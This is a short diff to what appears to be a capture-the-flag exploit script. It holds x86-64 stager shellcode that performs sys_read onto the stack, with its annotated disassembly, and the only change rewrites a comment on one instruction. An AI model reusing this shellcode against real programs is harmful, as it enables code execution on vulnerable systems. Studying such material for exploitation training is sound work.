@@ -18,7 +18,7 @@ frame="\x0c\x87\x63"$(printf "\x01%.0s" $(seq 1 17))
 shellcode_sys_read="\x0c\x87\x63\xd0\x48\x31\xc0\x48\x89\xc7\x48\x8d\x74\x24\x08\x0f\x05"
 : << Instruction
 0c 87                   or     al, 0x87
-63 d0                   movsxd edx, eax  # make sure edx won't be way too large, by the way this line can be executed, but it can't be assembled by nasm.
+63 d0                   movsxd edx, eax  # assign buffer size, by the way this line can be executed, but it can't be assembled by nasm.
 48 31 c0                xor    rax,rax
 48 89 c7                mov    rdi,rax
 48 8d 74 24 08          lea    rsi,[rsp+0x8]
